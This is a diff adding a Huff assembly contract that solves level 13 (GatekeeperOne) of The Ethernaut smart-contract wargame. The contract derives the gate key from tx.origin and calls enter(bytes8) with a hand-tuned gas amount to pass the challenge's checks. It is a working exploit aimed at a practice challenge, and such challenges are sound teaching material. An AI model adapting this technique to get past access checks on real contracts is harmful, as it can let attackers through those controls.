@@ -1,0 +1,70 @@
+/// @title A hack for level 13 (GatekeeperOne) of The Ethernaut
+/// @notice SPDX-License-Identifier: MIT
+/// @author unluckyduke7
+
+#define function hack(address) nonpayable returns ()
+
+#define macro MAIN() = takes (0) returns (0) {
+    // load function selector from calldata
+    0x00                                    // [0x00]
+    calldataload                            // [calldata @ 0x00]
+    0xe0                                    // [0xe0, calldata @ 0x00]
+    shr                                     // [selector]
+
+    // function dispatch                    
+    __FUNC_SIG(hack)                        // [__FUNC_SIG(hack), selector]
+    eq                                      // [__FUNC_SIG(hack) == selector]
+    hackJump                                // [hackJump, __FUNC_SIG(hack) == selector]
+    jumpi                                   // []
+
+    revertJump:
+        0x00 0x00 revert
+
+    hackJump:
+        // calculate gate key
+        origin                              // [origin]
+        0xffff                              // [0xffff, origin]
+        and                                 // [0xffff & origin]
+        0xffffffff00000000                  // [0xffffffff00000000, 0xffff & origin]
+        or                                  // [key]
+        
+        // generate callargs
+        __FUNC_SIG("enter(bytes8)")         // [__FUNC_SIG("enter(bytes8)"), key]
+        0x40                                // [0x40, __FUNC_SIG("enter(bytes8)"), key]
+        shl                                 // [__FUNC_SIG("enter(bytes8)") << 0x40, key]
+        or                                  // [key | __FUNC_SIG("enter(bytes8)") << 0x40]
+        0xa0                                // [0xa0, key | __FUNC_SIG("enter(bytes8)") << 0x40]
+        shl                                 // [callargs]   
+        
+        // store callargs in memory
+        0x00                                // [0x00, callargs]
+        mstore                              // []
+
+        // prepare stack for calling gatekeeperone instance
+        0x00                                // [0x00]
+        0x00                                // [0x00, 0x00]
+        0x24                                // [0x24, 0x00, 0x00]
+        0x00                                // [0x00, 0x24, 0x00, 0x00]
+        0x00                                // [0x00, 0x00, 0x24, 0x00, 0x00]
+
+        // validate instance input from calldata
+        0x04                                // [0x04, 0x00, 0x00, 0x24, 0x00, 0x00]
+        calldataload                        // [instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+        dup1                                // [instance, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+        0xa0                                // [0xa0, instance, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+        shr                                 // [instance >> 0xa0, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+        revertJump                          // [revertJump, instance >> 0xa0, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+        jumpi                               // [instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+
+		// use evm binary bundled with geth to check exact amount of gas to supply
+        0x80f6                              // [0x80f6, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+
+        // call instance and revert if unsuccessful
+        call                                // [success]
+        iszero                              // [!success]
+        revertJump                          // [revertJump, !success]
+        jumpi                               // []
+
+        // halt execution successfully
+        stop
+}
